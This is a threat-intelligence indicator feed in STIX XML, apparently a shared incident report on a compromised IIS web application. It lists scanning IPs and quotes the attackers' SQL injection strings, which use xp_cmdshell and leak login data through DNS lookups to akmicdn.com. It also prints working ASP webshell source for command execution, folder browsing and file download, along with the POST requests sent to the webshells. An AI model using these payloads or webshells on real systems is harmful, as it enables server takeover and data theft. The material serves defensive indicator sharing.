id="CISCP:indicator-00691daf-3376-450e-aa91-a089dcf06c95" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>The commands passed to the server via SQL injection originated from this IP, which is registered in the United States through the ISP Secured Servers, LLC. The domain akmicdn.com resolved to this IP during the time of initial compromise.

Commands passed via SQL injection in valid SOAP functions came from the IP 209.188.18.220, with sample SQL injection samples observed are as follows:

1)
' EXEC xp_cmdshell 'cmd.exe /c powershell -executionpolicy bypass c:\temp\cabarc2.ps1 -s t.xm.akmicdn.com'; --

2) The "S=" value is an authentication ID provided by the web application to administrative accounts.(vhxp= is the hex encoded command for "dir /b c:\inetpub\wwwroot\)
sales_LookupValues_Get= 
sales_LookupValues_Get/S=[redacted]';DECLARE @vhxp VARCHAR(8000);SET @vhxp=0x646972202f6220633a5c696e65747075625c777777726f6f745c;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @vhxp--

3) 
sales_LookupValues_Get/S=[redacted]'; DECLARE @host varchar(1024); SELECT @host='slw.'+(SELECT MAX(master.dbo.fn_varbintohexstr(CAST(SUBSTRING((ISNULL(CAST([tablename] AS NVARCHAR(4000)),' ')),1,13) AS VARBINARY(8000)))) FROM core.dbo.Admin_Logins WHERE CONVERT(NVARCHAR(4000),LoginID) LIKE CHAR(49)+CHAR(53)+CHAR(56)+CHAR(50))+'.skR.xm.akmicdn.com'; EXEC('master..xp_dirtree "\\'+@host+'\LoFb"')--
sales_LookupValues_Get= 

4) (vhxp= is the hex encoded command for "dir /b c:\inetpub\wwwroot\)
DECLARE @vhxp VARCHAR(8000);SET @vhxp=0x646972202f6220633a5c696e65747075625c777777726f6f745c;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @</indicator:Description><indicator:Observable id="CISCP:Observable-48bc8b4d-d763-48f0-97ce-9a8ba3fad5f8"><cybox:Object id="CISCP:Object-30236fee-9323-4c74-8ad5-443625c58807"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">209.188.18.220</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-d139c7e9-95ff-4c85-bfda-2c85b48cb88d" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-b15d912a-182b-4e18-9d4a-8830a18bff9f"><cybox:Object id="CISCP:Object-5b1f16bb-c022-4fb9-a3fd-87007af16f23"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">108.59.8.182</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-98756ca3-44b3-442a-9d87-d8619b49d080" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-3fd4ba89-20c4-448e-b106-2a8b9a19eb30"><cybox:Object id="CISCP:Object-bdd6683a-ef8b-4174-8ad1-08cf0890aa3f"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">109.163.226.153</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-2f94f9fd-cf8d-4718-97cb-530256b14ed9" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-f190e062-eedf-4230-91a5-44a6a27e9e1e"><cybox:Object id="CISCP:Object-25136be0-104b-4fd9-a40e-d8d44977baf6"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">176.126.252.11</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-875e57c0-5b74-4aaf-b3ec-49ab85671e7a" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-a8bf7498-9319-4c2d-9eb5-0b3f73979584"><cybox:Object id="CISCP:Object-9fa5ddfb-5fc3-49fe-9e6d-d90100e1693e"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">176.31.190.158</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-cb44b432-08bb-40f7-8c4e-331a90d96486" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-fa47dd27-e9e5-40a3-b4e2-5fdce852df96"><cybox:Object id="CISCP:Object-d36a46f0-3ce4-48c5-9780-0b0a537e2117"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">178.16.220.162</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-9436f298-8b60-4c11-af78-4b9913828977" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-4e990f3e-0e12-4820-a771-98e3ee65003b"><cybox:Object id="CISCP:Object-0a965ee2-81b6-4090-ad88-486e4f9bd7e5"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">178.248.30.132</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-3bfa0204-094b-480a-b027-5231dec0159c" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-dbc9c548-3dc9-4951-a025-e03d0a2afdb6"><cybox:Object id="CISCP:Object-029c62ee-3457-454f-bfae-713f9c4071ea"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">184.75.214.163</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-94a85160-54d6-49fe-8940-030f8ff6ffd4" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-aa3bcf59-3fea-4dea-a3d4-0660ee5ed3dc"><cybox:Object id="CISCP:Object-cd2c5d88-1f96-4966-9690-504b636969d4"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">198.24.172.2</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-5cd0de53-3cad-4964-a656-342dc90030c8" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-832e2d7e-62eb-438b-b537-f7b079012a9c"><cybox:Object id="CISCP:Object-53ef723f-7658-4e76-ab1b-5b6fb32b4e34"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">37.220.35.61</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-8f3f36ef-7eee-4210-ba79-6034055954d3" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-a6883deb-ae5a-4062-9df4-99944bc9c796"><cybox:Object id="CISCP:Object-ec6365ff-a05c-432d-ba19-0f8ae9d7f77f"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">37.221.162.226</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-0dc4e882-6e49-482a-a701-60dbd77af16c" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.

On 22 Dec 2014, access was attempted (unsuccessfully) by this IP address again using SOAP function calls.</indicator:Description><indicator:Observable id="CISCP:Observable-78337b26-cdc9-4d30-9343-c5f51be3c725"><cybox:Object id="CISCP:Object-fc385a74-54ad-4377-b411-0eee191f15ff"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">37.48.81.54</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-8abcd5ae-28e2-48dc-afd6-950ade723892" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-7756d980-c06d-4271-84a2-22a9d1431c4b"><cybox:Object id="CISCP:Object-838f80e9-6509-46e7-9434-510015dac6d4"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">46.19.137.116</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-6a10e8a8-0bd9-4eed-9ec4-2df2c69330e5" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-988a0364-2bd9-43a2-b220-a8e185938bef"><cybox:Object id="CISCP:Object-40b2377d-f29f-407f-8a57-39097ca747b0"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">5.104.224.15</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-3a99d370-0999-44da-90ad-900a79f2b2a4" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-6ec31e4c-b9ff-4e8d-8770-df7e2438f736"><cybox:Object id="CISCP:Object-62b1c78e-80b7-449d-a6a9-f1b5692cf20d"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">5.79.68.161</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-1c8e08f5-3a73-4e0e-a5eb-6ea2dece8e25" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-fa61e9ea-3311-4206-9a0e-090afcbf3bb0"><cybox:Object id="CISCP:Object-583ab6cb-1968-4f69-86a7-e050608ca9df"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">84.39.117.57</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-50e9a330-9784-40f0-ad8c-92bf9e5fdc25" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-81d8ed7d-63d8-44a3-a17b-9f277e06109e"><cybox:Object id="CISCP:Object-46be993a-ba91-43bb-a587-5683c94dfe70"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">95.211.138.225</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-6d30d470-1987-4198-82fc-a144451f2485" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-4e15e9f5-258a-4420-b893-9cf41dc35856"><cybox:Object id="CISCP:Object-cd20df81-c96a-4d38-ab0e-b20a49d8b5f1"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">95.211.138.33</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-3eb1830a-ef39-426f-9a86-0b9a43ff6305" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-6d84dfbe-6899-440b-a6fa-6ce7b5bc0410"><cybox:Object id="CISCP:Object-c97f3c00-7e8c-4e13-b724-712d2328ee60"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">95.211.140.99</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-10afc43b-61fb-44f8-80d7-8d21142d3a53" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 5 Dec 2014, dirbuster, acunetix, nessus, wget, and IIS Shortname Scanner scanning activity was observed on the previously compromised web server from this IP address.</indicator:Description><indicator:Observable id="CISCP:Observable-2536540d-6a91-4684-8dda-3876beb4bde2"><cybox:Object id="CISCP:Object-d4122f66-5594-451a-82f5-c6fd601d46c4"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">95.211.152.2</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-05T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-109a19ee-5fd2-4232-b8d9-849dbe2a7541" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 10 Dec, 2014, this IP address, along with 84.39.117.57, was observed uploading webshells (base64 encoded) to the server via SOAP function calls. This activity was immediately detected and remediated.

Webshell details are as follows:

C:\INETPUB\WWWROOT\[webserver]ADMINEXT\FILEINFO.asp
C:\INETPUB\WWWROOT\AVHUBLOG.asp
C:\INETPUB\WWWROOT\AVLOG.asp
C:\INETPUB\WWWROOT\CORETMPCORE.txt
C:\INETPUB\WWWROOT\services.asp
C:\INETPUB\WWWROOT\AVLOG.asp

Contents of avlog.asp
&lt;%
Set oSc = Server.CreateObject("WSCRIPT.SHELL")
oout = ""
mc = request("mc")
If (mc &lt;&gt; "") Then
  Set res = oSc.Exec("cmd.exe /c """&amp;mc&amp;"""")
  oout = res.stdout.readall + res.stderr.readall 
End If
%&gt;
&lt;plaintext&gt;&lt;%
If (oout &lt;&gt; "") Then
  Response.Write oout
End If
%&gt;

Contents of avhublog.asp:
&lt;%
If request("t")="d" then
	Set l=CreateObject("Scripting.FileSystemObject").GetFolder(request("f"))
	o=""
	for each e in l.SubFolders
	o=o&amp;"&lt;a href=""?t=d&amp;f="&amp;server.URLencode(e.path)&amp;"""&gt;"&amp;e.Name&amp;"&lt;/a&gt;&lt;br&gt;"
	next
	for each e in l.Files
	o=o&amp;"&lt;a href=""sld.cer?f="&amp;server.URLencode(e.path)&amp;"&amp;fn="&amp;server.URLencode(e.Name)&amp;"""&gt;"&amp;e.Name&amp;":"&amp;e.Size&amp;"&lt;/a&gt;&lt;br&gt;"
	next
	Response.Write(o)
End If
%&gt;

Partial contents of fileinfo.asp
&lt;%
f = Request("f")
If f &lt;&gt; "" Then
    Set o = Server.CreateObject("ADODB.Stream")
    o.Type = 1
    o.Open
    o.LoadFromFile(f)
    Response.ContentType = "application/x-unknown"
    Response.Addheader "Content-Disposition", "attachment; filename=" &amp; Request("fn")
    Response.AddHeader "Content-Length", o.Size
    Do While Not o.EOS And Response.IsClientConnected
        Response.BinaryWrite o.Read(1024)
        Response.Flus

 12.) Impact from this incident. : Low: limited adverse effect
 13.) Incident Description (Shared) : 
     Continuation from previous section above:

Attempted webshell interaction:
1)
POST /avlog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

t=d&amp;f=C:\inetpub\wwwroot

2)
POST /avlog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

mc=whoami

3)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

t=d&amp;f=C:\inetpub\wwwroot\[redacted]adminext

4)
POST /avlog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

t=d&amp;f=C:\[redacted].rtf

5)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

t=d&amp;f=C:\keyfiles

6)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

t=d&amp;f=C:\serveradministrator

7)
